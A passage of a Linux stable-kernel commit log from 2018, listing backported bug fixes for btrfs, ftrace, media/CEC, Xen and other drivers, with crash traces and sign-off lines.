When mounting certain crafted image, btrfs will trigger kernel BUG\_ON()
when trying to recover balance:
kernel BUG at fs/btrfs/extent-tree.c:8956!
invalid opcode: 0000 [#1] PREEMPT SMP NOPTI
CPU: 1 PID: 662 Comm: mount Not tainted 4.18.0-rc1-custom+ #10
RIP: 0010:walk\_up\_proc+0x336/0x480 [btrfs]
RSP: 0018:ffffb53540c9b890 EFLAGS: 00010202
Call Trace:
walk\_up\_tree+0x172/0x1f0 [btrfs]
btrfs\_drop\_snapshot+0x3a4/0x830 [btrfs]
merge\_reloc\_roots+0xe1/0x1d0 [btrfs]
btrfs\_recover\_relocation+0x3ea/0x420 [btrfs]
open\_ctree+0x1af3/0x1dd0 [btrfs]
btrfs\_mount\_root+0x66b/0x740 [btrfs]
mount\_fs+0x3b/0x16a
vfs\_kern\_mount.part.9+0x54/0x140
btrfs\_mount+0x16d/0x890 [btrfs]
mount\_fs+0x3b/0x16a
vfs\_kern\_mount.part.9+0x54/0x140
do\_mount+0x1fd/0xda0
ksys\_mount+0xba/0xd0
\_\_x64\_sys\_mount+0x21/0x30
do\_syscall\_64+0x60/0x210
entry\_SYSCALL\_64\_after\_hwframe+0x49/0xbe
[CAUSE]
Extent tree corruption. In this particular case, reloc tree root's
owner is DATA\_RELOC\_TREE (should be TREE\_RELOC), thus its backref is
corrupted and we failed the owner check in walk\_up\_tree().
[FIX]
It's pretty hard to take care of every extent tree corruption, but at
least we can remove such BUG\_ON() and exit more gracefully.
And since in this particular image, DATA\_RELOC\_TREE and TREE\_RELOC share
the same root (which is obviously invalid), we needs to make
\_\_del\_reloc\_root() more robust to detect such invalid sharing to avoid
possible NULL dereference as root->node can be NULL in this case.
Link: https://bugzilla.kernel.org/show\_bug.cgi?id=200411
Reported-by: Xu Wen
CC: stable@vger.kernel.org # 4.4+
Signed-off-by: Qu Wenruo
Reviewed-by: David Sterba
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 68b0e1cae6f38f147fd43cd90bcf20c260168c29
Author: Qu Wenruo
Date: Tue Oct 9 14:36:45 2018 +0800
btrfs: qgroup: Avoid calling qgroup functions if qgroup is not enabled
commit 3628b4ca64f24a4ec55055597d0cb1c814729f8b upstream.
Some qgroup trace events like btrfs\_qgroup\_release\_data() and
btrfs\_qgroup\_free\_delayed\_ref() can still be triggered even if qgroup is
not enabled.
This is caused by the lack of qgroup status check before calling some
qgroup functions. Thankfully the functions can handle quota disabled
case well and just do nothing for qgroup disabled case.
This patch will do earlier check before triggering related trace events.
And for enabled <-> disabled race case:
1) For enabled->disabled case
Disable will wipe out all qgroups data including reservation and
excl/rfer. Even if we leak some reservation or numbers, it will
still be cleared, so nothing will go wrong.
2) For disabled -> enabled case
Current btrfs\_qgroup\_release\_data() will use extent\_io tree to ensure
we won't underflow reservation. And for delayed\_ref we use
head->qgroup\_reserved to record the reserved space, so in that case
head->qgroup\_reserved should be 0 and we won't underflow.
CC: stable@vger.kernel.org # 4.14+
Reported-by: Chris Murphy
Link: https://lore.kernel.org/linux-btrfs/CAJCQCtQau7DtuUUeycCkZ36qjbKuxNzsgqJ7+sJ6W0dK\_NLE3w@mail.gmail.com/
Signed-off-by: Qu Wenruo
Reviewed-by: David Sterba
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 3734cce8cf6c59ba60c1a501fbcf020c33063ebf
Author: Masami Hiramatsu
Date: Mon Oct 22 00:08:20 2018 +0900
tracing: Return -ENOENT if there is no target synthetic event
commit 18858511fd8a877303cc34c06efa461b26a0e070 upstream.
Return -ENOENT error if there is no target synthetic event.
This notices an operation failure to user as below;
# echo 'wakeup\_latency u64 lat; pid\_t pid;' > synthetic\_events
# echo '!wakeup' >> synthetic\_events
sh: write error: No such file or directory
Link: http://lkml.kernel.org/r/154013449986.25576.9487131386597290172.stgit@devbox
Acked-by: Tom Zanussi
Tested-by: Tom Zanussi
Cc: Shuah Khan
Cc: Rajvi Jingar
Cc: stable@vger.kernel.org
Fixes: 4b147936fa50 ('tracing: Add support for 'synthetic' events')
Signed-off-by: Masami Hiramatsu
Signed-off-by: Steven Rostedt (VMware)
Signed-off-by: Greg Kroah-Hartman
commit 7d3714bb7abe85fd7d72854c2043997b47be580a
Author: Breno Leitao
Date: Mon Oct 22 18:16:26 2018 -0300
selftests/powerpc: Fix ptrace tm failure
commit 48dc0ef19044bfb69193302fbe3a834e3331b7ae upstream.
Test ptrace-tm-spd-gpr fails on current kernel (4.19) due to a segmentation
fault that happens on the child process prior to setting cptr[2] = 1. This
causes the parent process to wait forever at 'while (!pptr[2])' and the test to
be killed by the test harness framework by timeout, thus, failing.
The segmentation fault happens because of a inline assembly being
generated as:
0x10000355c  lfs f0, 0(0)
This is reading memory position 0x0 and causing the segmentation fault.
This code is being generated by ASM\_LOAD\_FPR\_SINGLE\_PRECISION(flt\_4), where
flt\_4 is passed to the inline assembly block as:
[flt\_4] "r" (&d)
Since the inline assembly 'r' constraint means any GPR, gpr0 is being
chosen, thus causing this issue when issuing a Load Floating-Point Single
instruction.
This patch simply changes the constraint to 'b', which specify that this
register will be used as base, and r0 is not allowed to be used, avoiding
this issue.
Other than that, removing flt\_2 register from the input operands, since it
is not used by the inline assembly code at all.
Cc: stable@vger.kernel.org
Signed-off-by: Breno Leitao
Acked-by: Segher Boessenkool
Signed-off-by: Michael Ellerman
Signed-off-by: Greg Kroah-Hartman
commit 4bd6237fc951fa96267d20192349d9b8e8239245
Author: Masami Hiramatsu
Date: Mon Oct 22 00:08:48 2018 +0900
selftests/ftrace: Fix synthetic event test to delete event correctly
commit 0d0352d8b3d6d7ca9a710b40e194cbbaeb841c88 upstream.
Fix the synthetic event test case to remove event correctly.
If redirecting command to synthetic\_event file without append
mode, it cleans up all existing events and execute (parse) the
command. This means "delete event" always fails to find the
target event.
Since previous synthetic event has a bug which doesn't return
-ENOENT even if it fails to find the deleting event, this test
passed. But fixing that bug, this test fails because this test
itself has a bug.
This fixes that bug by trying to delete event right after
adding an event, and use append mode redirection ('>>') instead
of normal redirection ('>').
Link: http://lkml.kernel.org/r/154013452832.25576.2305459545429386517.stgit@devbox
Acked-by: Shuah Khan
Acked-by: Tom Zanussi
Tested-by: Tom Zanussi
Cc: Tom Zanussi
Cc: Tom Zanussi
Cc: Rajvi Jingar
Cc: Shuah Khan
Cc: stable@vger.kernel.org
Fixes: f06eec4d0f2c ('selftests: ftrace: Add inter-event hist triggers testcases')
Signed-off-by: Masami Hiramatsu
Signed-off-by: Steven Rostedt (VMware)
Signed-off-by: Greg Kroah-Hartman
commit efd03258cc5c690ae7a6be7cd48a2f3edf2122eb
Author: Johan Hovold
Date: Wed Nov 15 10:44:58 2017 +0100
soc/tegra: pmc: Fix child-node lookup
commit 1dc6bd5e39a29453bdcc17348dd2a89f1aa4004e upstream.
Fix child-node lookup during probe, which ended up searching the whole
device tree depth-first starting at the parent rather than just matching
on its children.
To make things worse, the parent pmc node could end up being prematurely
freed as of\_find\_node\_by\_name() drops a reference to its first argument.
Fixes: 3568df3d31d6 ("soc: tegra: Add thermal reset (thermtrip) support to PMC")
Cc: stable  # 4.0
Cc: Mikko Perttunen
Signed-off-by: Johan Hovold
Reviewed-by: Mikko Perttunen
Signed-off-by: Thierry Reding
Signed-off-by: Greg Kroah-Hartman
commit d4d1e7a2b1c876a16d9bbeeaee98eb2a17b2007a
Author: Bjorn Andersson
Date: Mon Aug 27 22:05:48 2018 -0700
soc: qcom: rmtfs-mem: Validate that scm is available
commit 137dc5843faeacabf48fc22a8dc58c4e0b4f0927 upstream.
The scm device must be present in order for the rmtfs driver to
configure memory permissions for the rmtfs memory region, so check that
it is probed before continuing.
Cc: stable@vger.kernel.org
Fixes: fa65f8045137 ("soc: qcom: rmtfs-mem: Add support for assigning memory to remote")
Signed-off-by: Bjorn Andersson
Signed-off-by: Andy Gross
Signed-off-by: Greg Kroah-Hartman
commit 4bfdd88d22a151a7c32b1e759666fd97a03a90d9
Author: Thor Thayer
Date: Tue Sep 25 10:31:52 2018 -0500
arm64: dts: stratix10: Correct System Manager register size
commit 74121b9aa3cd571ddfff014a9f47db36cae3cda9 upstream.
Correct the register size of the System Manager node.
Cc: stable@vger.kernel.org
Fixes: 78cd6a9d8e154 ("arm64: dts: Add base stratix 10 dtsi")
Signed-off-by: Thor Thayer
Signed-off-by: Dinh Nguyen
Signed-off-by: Greg Kroah-Hartman
commit 09242a77726c5e0e84cb09c8a3b5476e9b80d613
Author: Thor Thayer
Date: Tue Sep 25 10:21:10 2018 -0500
ARM: dts: socfpga: Fix SDRAM node address for Arria10
commit ce3bf934f919a7d675c5b7fa4cc233ded9c6256e upstream.
The address in the SDRAM node was incorrect. Fix this to agree with the
correct address and to match the reg definition block.
Cc: stable@vger.kernel.org
Fixes: 54b4a8f57848b("arm: socfpga: dts: Add Arria10 SDRAM EDAC DTS support")
Signed-off-by: Thor Thayer
Signed-off-by: Dinh Nguyen
Signed-off-by: Greg Kroah-Hartman
commit 29b85eacc07ade392d2a50c4e728f09cf677e70a
Author: Nicolas Pitre
Date: Tue Oct 30 13:26:15 2018 -0400
Cramfs: fix abad comparison when wrap-arounds occur
commit 672ca9dd13f1aca0c17516f76fc5b0e8344b3e46 upstream.
It is possible for corrupted filesystem images to produce very large
block offsets that may wrap when a length is added, and wrongly pass
the buffer size test.
Reported-by: Anatoly Trosinenko
Signed-off-by: Nicolas Pitre
Cc: stable@vger.kernel.org
Signed-off-by: Greg Kroah-Hartman
commit cb3de273d7a34451dfc9d5042703fe3c6679b568
Author: Colin Ian King
Date: Thu Sep 27 22:36:27 2018 +0100
rpmsg: smd: fix memory leak on channel create
commit 940c620d6af8fca7d115de40f19870fba415efac upstream.
Currently a failed allocation of channel->name leads to an
immediate return without freeing channel. Fix this by setting
ret to -ENOMEM and jumping to an exit path that kfree's channel.
Detected by CoverityScan, CID#1473692 ("Resource Leak")
Fixes: 53e2822e56c7 ("rpmsg: Introduce Qualcomm SMD backend")
Cc: stable@vger.kernel.org
Signed-off-by: Colin Ian King
Signed-off-by: Bjorn Andersson
Signed-off-by: Greg Kroah-Hartman
commit fd376dc39890fbbfa4967953f947d6ec1caba795
Author: Tri Vo
Date: Wed Sep 19 12:27:50 2018 -0700
arm64: lse: remove -fcall-used-x0 flag
commit 2a6c7c367de82951c98a290a21156770f6f82c84 upstream.
x0 is not callee-saved in the PCS. So there is no need to specify
-fcall-used-x0.
Clang doesn't currently support -fcall-used flags. This patch will help
building the kernel with clang.
Tested-by: Nick Desaulniers
Acked-by: Will Deacon
Signed-off-by: Tri Vo
Signed-off-by: Catalin Marinas
Signed-off-by: Greg Kroah-Hartman
commit 391d6f13307e4026f518051f611e5fd50478b26d
Author: Hans Verkuil
Date: Thu Sep 13 07:47:29 2018 -0400
media: hdmi.h: rename ADOBE\_RGB to OPRGB and ADOBE\_YCC to OPYCC
commit 463659a08d7999d5461fa45b35b17686189a70ca upstream.
These names have been renamed in the CTA-861 standard due to trademark
issues. Replace them here as well so they are in sync with the standard.
Signed-off-by: Hans Verkuil
Cc: stable@vger.kernel.org
Acked-by: Daniel Vetter
Signed-off-by: Mauro Carvalho Chehab
Signed-off-by: Greg Kroah-Hartman
commit 11e879dd4a6d7c50ae80790cade70c4c2a1a4f11
Author: Hans Verkuil
Date: Fri Sep 14 04:58:03 2018 -0400
media: replace ADOBERGB by OPRGB
commit db0340182444612bcadb98bdec22f651aa42266c upstream.
The CTA-861 standards have been updated to refer to opRGB instead
of AdobeRGB. The official standard is in fact named opRGB, so
switch to that.
The two old defines referring to ADOBERGB in the public API are
put under #ifndef \_\_KERNEL\_\_ and a comment mentions that they are
deprecated.
Signed-off-by: Hans Verkuil
Cc: stable@vger.kernel.org
Acked-by: Daniel Vetter
Signed-off-by: Mauro Carvalho Chehab
Signed-off-by: Greg Kroah-Hartman
commit aff52a2f431b92dc1febd15a5b84d014444281ec
Author: Hans Verkuil
Date: Thu Sep 13 07:47:28 2018 -0400
media: media colorspaces\*.rst: rename AdobeRGB to opRGB
commit a58c37978cf02f6d35d05ee4e9288cb8455f1401 upstream.
Drop all Adobe references and use the official opRGB standard
instead.
Signed-off-by: Hans Verkuil
Cc: stable@vger.kernel.org
Acked-by: Daniel Vetter
Signed-off-by: Mauro Carvalho Chehab
Signed-off-by: Greg Kroah-Hartman
commit 2b33dfe74c2a95de32b840e3a88e22004cbed9ab
Author: Johan Hovold
Date: Mon Aug 27 10:21:46 2018 +0200
drm/mediatek: fix OF sibling-node lookup
commit ceff2f4dcd44abf35864d9a99f85ac619e89a01d upstream.
Use the new of\_get\_compatible\_child() helper to lookup the sibling
instead of using of\_find\_compatible\_node(), which searches the entire
tree from a given start node and thus can return an unrelated (i.e.
non-sibling) node.
This also addresses a potential use-after-free (e.g. after probe
deferral) as the tree-wide helper drops a reference to its first
argument (i.e. the parent device node).
While at it, also fix the related cec-node reference leak.
Fixes: 8f83f26891e1 ("drm/mediatek: Add HDMI support")
Cc: stable  # 4.8
Cc: Junzhi Zhao
Cc: Philipp Zabel
Cc: CK Hu
Cc: David Airlie
Signed-off-by: Johan Hovold
Signed-off-by: Rob Herring
Signed-off-by: Greg Kroah-Hartman
commit 795449cb0c51b4d9c57ada3120a2421dc6e301de
Author: Hans Verkuil
Date: Thu Oct 4 03:58:34 2018 -0400
media: adv7842: when the EDID is cleared, unconfigure CEC as well
commit ab83203e181015b099720aff43ffabc1812e0fb3 upstream.
When there is no EDID the CEC adapter should be unconfigured as
well. So call cec\_phys\_addr\_invalidate() when this happens.
Signed-off-by: Hans Verkuil
Cc:  # for v4.18 and up
Signed-off-by: Mauro Carvalho Chehab
Signed-off-by: Greg Kroah-Hartman
commit feb3a39a17abb7ca51fa509d530f510ef8f840e3
Author: Hans Verkuil
Date: Thu Oct 4 03:57:06 2018 -0400
media: adv7604: when the EDID is cleared, unconfigure CEC as well
commit e7da89926f6dc6cf855f5ffdf79ef99a1b115ca7 upstream.
When there is no EDID the CEC adapter should be unconfigured as
well. So call cec\_phys\_addr\_invalidate() when this happens.
Signed-off-by: Hans Verkuil
Cc:  # for v4.18 and up
Signed-off-by: Mauro Carvalho Chehab
Signed-off-by: Greg Kroah-Hartman
commit 5df5d951c10716cea03c0aa2c8301d890788fa50
Author: Mauro Carvalho Chehab
Date: Fri Sep 14 13:13:15 2018 -0400
media: em28xx: fix handler for vidioc\_s\_input()
commit 258c430456ba5f0005043762e14fc3be35983aaf upstream.
The a->index is not the name of the internal amux entry,
but, instead a value from zero to the maximum number
of audio inputs.
As the actual available inputs depend on each board, build
it dynamically.
This is broken for a really long time. On a quick check,
since at least commit 195a4ef627e1 ("V4L/DVB (6585): Convert
em28xx to video\_ioctl2") this was not implemented right.
Fixes: 195a4ef627e1 ("V4L/DVB (6585): Convert em28xx to video\_ioctl2")
Cc: stable@vger.kernel.org
Signed-off-by: Mauro Carvalho Chehab
Signed-off-by: Greg Kroah-Hartman
commit 634eb3c8780abf19ccf6a76d41a610b4a1305a3c
Author: Mauro Carvalho Chehab
Date: Thu Sep 13 22:46:29 2018 -0400
media: em28xx: make v4l2-compliance happier by starting sequence on zero
commit afeaade90db4c5dab93f326d9582be1d5954a198 upstream.
The v4l2-compliance tool complains if a video doesn't start
with a zero sequence number.
While this shouldn't cause any real problem for apps, let's
make it happier, in order to better check the v4l2-compliance
differences before and after patchsets.
This is actually an old issue. It is there since at least its
videobuf2 conversion, e. g. changeset 3829fadc461 ("[media]
em28xx: convert to videobuf2"), if VB1 wouldn't suffer from
the same issue.
Cc: stable@vger.kernel.org
Fixes: d3829fadc461 ("[media] em28xx: convert to videobuf2")
Signed-off-by: Mauro Carvalho Chehab
Signed-off-by: Greg Kroah-Hartman
commit be91657a304c95ee6dc6b35a898d9714cae2395a
Author: Mauro Carvalho Chehab
Date: Fri Sep 14 00:20:21 2018 -0400
media: em28xx: fix input name for Terratec AV 350
commit 15644bfa195bd166d0a5ed76ae2d587f719c3dac upstream.
Instead of using a register value, use an AMUX name, as otherwise
VIDIOC\_G\_AUDIO would fail.
Cc: stable@vger.kernel.org
Fixes: 766ed64de554 ("V4L/DVB (11827): Add support for Terratec Grabster AV350")
Signed-off-by: Mauro Carvalho Chehab
Signed-off-by: Greg Kroah-Hartman
commit 95dfd1d5aad413836d40fe504c5906813c063218
Author: Mauro Carvalho Chehab
Date: Thu Sep 13 16:49:51 2018 -0400
media: tvp5150: avoid going past array on v4l2\_querymenu()
commit 5c4c4505b716cb782ad7263091edc466c4d1fbd4 upstream.
The parameters of v4l2\_ctrl\_new\_std\_menu\_items() are tricky: instead of
the number of possible values, it requires the number of the maximum
value. In other words, the ARRAY\_SIZE() value should be decremented,
otherwise it will go past the array bounds, as warned by KASAN:
[ 279.839688] BUG: KASAN: global-out-of-bounds in v4l2\_querymenu+0x10d/0x180 [videodev]
[ 279.839709] Read of size 8 at addr ffffffffc10a4cb0 by task v4l2-compliance/16676
[ 279.839736] CPU: 1 PID: 16676 Comm: v4l2-compliance Not tainted 4.18.0-rc2+ #120
[ 279.839741] Hardware name: /NUC5i7RYB, BIOS RYBDWi35.86A.0364.2017.0511.0949 05/11/2017
[ 279.839743] Call Trace:
[ 279.839758] dump\_stack+0x71/0xab
[ 279.839807] ? v4l2\_querymenu+0x10d/0x180 [videodev]
[ 279.839817] print\_address\_description+0x1c9/0x270
[ 279.839863] ? v4l2\_querymenu+0x10d/0x180 [videodev]
[ 279.839871] kasan\_report+0x237/0x360
[ 279.839918] v4l2\_querymenu+0x10d/0x180 [videodev]
[ 279.839964] \_\_video\_do\_ioctl+0x2c8/0x590 [videodev]
[ 279.840011] ? copy\_overflow+0x20/0x20 [videodev]
[ 279.840020] ? avc\_ss\_reset+0xa0/0xa0
[ 279.840028] ? check\_stack\_object+0x21/0x60
[ 279.840036] ? \_\_check\_object\_size+0xe7/0x240
[ 279.840080] video\_usercopy+0xed/0x730 [videodev]
[ 279.840123] ? copy\_overflow+0x20/0x20 [videodev]
[ 279.840167] ? v4l\_enumstd+0x40/0x40 [videodev]
[ 279.840177] ? \_\_handle\_mm\_fault+0x9f9/0x1ba0
[ 279.840186] ? \_\_pmd\_alloc+0x2c0/0x2c0
[ 279.840193] ? \_\_vfs\_write+0xb6/0x350
[ 279.840200] ? kernel\_read+0xa0/0xa0
[ 279.840244] ? video\_usercopy+0x730/0x730 [videodev]
[ 279.840284] v4l2\_ioctl+0xa1/0xb0 [videodev]
[ 279.840295] do\_vfs\_ioctl+0x117/0x8a0
[ 279.840303] ? selinux\_file\_ioctl+0x211/0x2f0
[ 279.840313] ? ioctl\_preallocate+0x120/0x120
[ 279.840319] ? selinux\_capable+0x20/0x20
[ 279.840332] ksys\_ioctl+0x70/0x80
[ 279.840342] \_\_x64\_sys\_ioctl+0x3d/0x50
[ 279.840351] do\_syscall\_64+0x6d/0x1c0
[ 279.840361] entry\_SYSCALL\_64\_after\_hwframe+0x44/0xa9
[ 279.840367] RIP: 0033:0x7fdfb46275d7
[ 279.840369] Code: b3 66 90 48 8b 05 b1 48 2d 00 64 c7 00 26 00 00 00 48 c7 c0 ff ff ff ff c3 66 2e 0f 1f 84 00 00 00 00 00 b8 10 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 81 48 2d 00 f7 d8 64 89 01 48
[ 279.840474] RSP: 002b:00007ffee1179038 EFLAGS: 00000202 ORIG\_RAX: 0000000000000010
[ 279.840483] RAX: ffffffffffffffda RBX: 00007ffee1179180 RCX: 00007fdfb46275d7
[ 279.840488] RDX: 00007ffee11790c0 RSI: 00000000c02c5625 RDI: 0000000000000003
[ 279.840493] RBP: 0000000000000002 R08: 0000000000000020 R09: 00000000009f0902
[ 279.840497] R10: 0000000000000000 R11: 0000000000000202 R12: 00007ffee117a5a0
[ 279.840501] R13: 00007ffee11790c0 R14: 0000000000000002 R15: 0000000000000000
[ 279.840515] The buggy address belongs to the variable:
[ 279.840535] tvp5150\_test\_patterns+0x10/0xffffffffffffe360 [tvp5150]
Fixes: c43875f66140 ("[media] tvp5150: replace MEDIA\_ENT\_F\_CONN\_TEST by a control")
Cc: stable@vger.kernel.org
Signed-off-by: Mauro Carvalho Chehab
Signed-off-by: Greg Kroah-Hartman
commit 1ac7a4b394ad3f41bfa6cd36bd4e4389085db749
Author: Mauro Carvalho Chehab
Date: Thu Sep 13 23:22:40 2018 -0400
media: em28xx: use a default format if TRY\_FMT fails
commit f823ce2a1202d47110a7ef86b65839f0be8adc38 upstream.
Follow the V4L2 spec, as warned by v4l2-compliance:
warn: v4l2-test-formats.cpp(732): TRY\_FMT cannot handle an invalid pixelformat.
warn: v4l2-test-formats.cpp(733): This may or may not be a problem. For more information see:
warn: v4l2-test-formats.cpp(734): http://www.mail-archive.com/linux-media@vger.kernel.org/msg56550.html
Cc: stable@vger.kernel.org
Fixes: bddcf63313c6 ("V4L/DVB (9927): em28xx: use a more standard way to specify video formats")
Signed-off-by: Mauro Carvalho Chehab
Signed-off-by: Greg Kroah-Hartman
commit e448dfd6d3ec944411f6575bc24e4f8baa1e297f
Author: Hans Verkuil
Date: Mon Oct 15 06:14:22 2018 -0400
media: cec: forgot to cancel delayed work
commit 490d84f6d73c12f4204241cff8651eed60aae914 upstream.
If the wait for completion was interrupted, then make sure to cancel
any delayed work.
This can only happen if a transmit is waiting for a reply, and you press
Ctrl-C or reboot/poweroff or something like that which interrupts the
thread waiting for the reply and then proceeds to delete the CEC message.
Since the delayed work wasn't canceled, once it would trigger it referred
to stale data and resulted in a kernel oops.
Fixes: 7ec2b3b941a6 ("cec: add new tx/rx status bits to detect aborts/timeouts")
Signed-off-by: Hans Verkuil
Cc:  # for v4.18 and up
Signed-off-by: Mauro Carvalho Chehab
Signed-off-by: Greg Kroah-Hartman
commit b8ee0bd5b09997ef69cb39e9b451683cf5f6badf
Author: Hans Verkuil
Date: Fri Oct 5 08:00:21 2018 -0400
media: cec: fix the Signal Free Time calculation
commit 7d867a1b765e2b70815fec4964d7822a976ed349 upstream.
The calculation of the Signal Free Time in the framework was not
correct. If a message was received, then the next transmit should be
considered a New Initiator and use a shorter SFT value.
This was not done with the result that if both sides where continually
sending messages, they both could use the same SFT value and one side
could deny the other side access to the bus.
Note that this fix does not take the corner case into account where
a receive is in progress when you call adap\_transmit.
Signed-off-by: Hans Verkuil
Cc:  # for v4.18 and up
Signed-off-by: Mauro Carvalho Chehab
Signed-off-by: Greg Kroah-Hartman
commit 11f9f361470d690dc8dd761dce906d30d2e4bd7b
Author: Hans Verkuil
Date: Thu Oct 4 03:28:21 2018 -0400
media: cec: add new tx/rx status bits to detect aborts/timeouts
commit 7ec2b3b941a666a942859684281b5f6460a0c234 upstream.
If the HDMI cable is disconnected or the CEC adapter is manually
unconfigured, then all pending transmits and wait-for-replies are
aborted. Signal this with new status bits (CEC\_RX/TX\_STATUS\_ABORTED).
If due to (usually) a driver bug a transmit never ends (i.e. the
transmit\_done was never called by the driver), then when this times
out the message is marked with CEC\_TX\_STATUS\_TIMEOUT.
This should not happen and is an indication of a driver bug.
Without a separate status bit for this it was impossible to detect
this from userspace.
The 'transmit timed out' kernel message is now a warning, so this
should be more prominent in the kernel log as well.
Signed-off-by: Hans Verkuil
Cc:  # for v4.18 and up
Signed-off-by: Mauro Carvalho Chehab
Signed-off-by: Greg Kroah-Hartman
commit 6b92b55fd2cfbb7c944bb0cd98e6e36d54015b51
Author: Manjunath Patil
Date: Tue Oct 30 09:49:21 2018 -0700
xen-blkfront: fix kernel panic with negotiate\_mq error path
commit 6cc4a0863c9709c512280c64e698d68443ac8053 upstream.
info->nr\_rings isn't adjusted in case of ENOMEM error from
negotiate\_mq(). This leads to kernel panic in error path.
Typical call stack involving panic -
#8 page\_fault at ffffffff8175936f
[exception RIP: blkif\_free\_ring+33]
RIP: ffffffffa0149491 RSP: ffff8804f7673c08 RFLAGS: 00010292
...
#9 blkif\_free at ffffffffa0149aaa [xen\_blkfront]
#10 talk\_to\_blkback at ffffffffa014c8cd [xen\_blkfront]
#11 blkback\_changed at ffffffffa014ea8b [xen\_blkfront]
#12 xenbus\_otherend\_changed at ffffffff81424670
#13 backend\_changed at ffffffff81426dc3
#14 xenwatch\_thread at ffffffff81422f29
#15 kthread at ffffffff810abe6a
#16 ret\_from\_fork at ffffffff81754078
Cc: stable@vger.kernel.org
Fixes: 7ed8ce1c5fc7 ("xen-blkfront: move negotiate\_mq to cover all cases of new VBDs")
Signed-off-by: Manjunath Patil
Acked-by: Roger Pau Monné
Signed-off-by: Juergen Gross
Signed-off-by: Greg Kroah-Hartman
commit 6bc564ec56820235ad0539713c117d17ee6b9698
Author: Juergen Gross
Date: Thu Nov 1 13:33:07 2018 +0100
xen: remove size limit of privcmd-buf mapping interface
commit 3941552aec1e04d63999988a057ae09a1c56ebeb upstream.
Currently the size of hypercall buffers allocated via
/dev/xen/hypercall is limited to a default of 64 memory pages. For live
migration of guests this might be too small as the page dirty bitmask
needs to be sized according to the size of the guest. This means
migrating a 8GB sized guest is already exhausting the default buffer
size for the dirty bitmap.
There is no sensible way to set a sane limit, so just remove it
completely. The device node's usage is limited to root anyway, so there
is no additional DOS scenario added by allowing unlimited buffers.
While at it make the error path for the -ENOMEM case a little bit
cleaner by setting n\_pages to the number of successfully allocated
pages instead of the target size.
Fixes: c51b3c639e01f2 ("xen: add new hypercall buffer mapping device")
Cc:  #4.18
Signed-off-by: Juergen Gross
Reviewed-by: Boris Ostrovsky
Signed-off-by: Juergen Gross
Signed-off-by: Greg Kroah-Hartman
commit 905632c2e61dcf488e4c26ee6e4f85187bb45486
Author: Juergen Gross
Date: Thu Nov 8 08:35:06 2018 +0100
xen: fix xen\_qlock\_wait()
commit d3132b3860f6cf35ff7609a76bbcdbb814bd027c upstream.
Commit a856531951dc80 ("xen: make xen\_qlock\_wait() nestable")
introduced a regression for Xen guests running fully virtualized
(HVM or PVH mode). The Xen hypervisor wouldn't return from the poll
hypercall with interrupts disabled in case of an interrupt (for PV
guests it does).
So instead of disabling interrupts in xen\_qlock\_wait() use a nesting
counter to avoid calling xen\_clear\_irq\_pending() in case
xen\_qlock\_wait() is nested.
Fixes: a856531951dc80 ("xen: make xen\_qlock\_wait() nestable")
Cc: stable@vger.kernel.org
Reported-by: Sander Eikelenboom
Signed-off-by: Juergen Gross
Reviewed-by: Boris Ostrovsky
Tested-by: Sander Eikelenboom
Signed-off-by: Juergen Gross
Signed-off-by: Greg Kroah-Hartman
commit dbcbbbbf5aa37675b19f509e2f0364774a09bf1c
Author: Hans Verkuil
Date: Thu Sep 13 03:36:29 2018 -0400
media: cec: integrate cec\_validate\_phys\_addr() in cec-api.c
commit e81bff39489a06384822bb38ce7a59f9e365bbe9 upstream.
The cec\_phys\_addr\_validate() function will be moved to V4L2,
so use a simplified variant of that function in cec-api.c.
cec now no longer calls cec\_phys\_addr\_validate() and it can
be safely moved to V4L2.
Signed-off-by: Hans Verkuil
Cc:  # for v4.17 and up
Signed-off-by: Mauro Carvalho Chehab
Signed-off-by: Greg Kroah-Hartman
commit e4e97d13dd135eeb7fd70e4b9f33ebfd874a06c7
Author: Hans Verkuil
Date: Thu Sep 13 03:25:59 2018 -0400
media: cec: make cec\_get\_edid\_spa\_location() an inline function
commit b915bf575d5b7774d0f22d57d6c143e07dcaade2 upstream.
This function is needed by both V4L2 and CEC, so move this to
cec.h as a static inline since there are no obvious shared
modules between the two subsystems.
This patch, together with the following ones, fixes a
dependency bug: if CEC\_CORE is disabled, then building adv7604
(and other HDMI receivers) will fail because an essential
function is now stubbed out.
Signed-off-by: Hans Verkuil
Cc:  # for v4.17 and up
Signed-off-by: Mauro Carvalho Chehab
Signed-off-by: Greg Kroah-Hartman
commit 239efda32abd24c270a0348f678cb3a99223189b
Author: He Zhe
Date: Fri Aug 17 22:42:28 2018 +0800
kgdboc: Passing ekgdboc to command line causes panic
commit 1bd54d851f50dea6af30c3e6ff4f3e9aab5558f9 upstream.
kgdboc\_option\_setup does not check input argument before passing it
to strlen. The argument would be a NULL pointer if "ekgdboc", without
its value, is set in command line and thus cause the following panic.
PANIC: early exception 0xe3 IP 10:ffffffff8fbbb620 error 0 cr2 0x0
[ 0.000000] CPU: 0 PID: 0 Comm: swapper Not tainted 4.18-rc8+ #1
[ 0.000000] RIP: 0010:strlen+0x0/0x20
...
[ 0.000000] Call Trace
[ 0.000000] ? kgdboc\_option\_setup+0x9/0xa0
[ 0.000000] ? kgdboc\_early\_init+0x6/0x1b
[ 0.000000] ? do\_early\_param+0x4d/0x82
[ 0.000000] ? parse\_args+0x212/0x330
[ 0.000000] ? rdinit\_setup+0x26/0x26
[ 0.000000] ? parse\_early\_options+0x20/0x23
[ 0.000000] ? rdinit\_setup+0x26/0x26
[ 0.000000] ? parse\_early\_param+0x2d/0x39
[ 0.000000] ? setup\_arch+0x2f7/0xbf4
[ 0.000000] ? start\_kernel+0x5e/0x4c2
[ 0.000000] ? load\_ucode\_bsp+0x113/0x12f
[ 0.000000] ? secondary\_startup\_64+0xa5/0xb0
This patch adds a check to prevent the panic.
Cc: stable@vger.kernel.org
Cc: jason.wessel@windriver.com
Cc: gregkh@linuxfoundation.org
Cc: jslaby@suse.com
Signed-off-by: He Zhe
Reviewed-by: Daniel Thompson
Signed-off-by: Greg Kroah-Hartman
commit e589ba2d14ad6c9deaf2674a39800e320003aa5c
Author: Mauro Carvalho Chehab
Date: Fri Oct 5 10:21:25 2018 -0400
Revert "media: dvbsky: use just one mutex for serializing device R/W ops"
commit 9afc82194de9a1ce298f0d77d7d779d585bf962c upstream.
As pointed at:
https://bugzilla.kernel.org/show\_bug.cgi?id=199323
This patch causes a bad effect on RPi. I suspect that the root
cause is at the USB out of tree RPi driver, with uses high priority
interrupts instead of normal ones. Anyway, as this patch
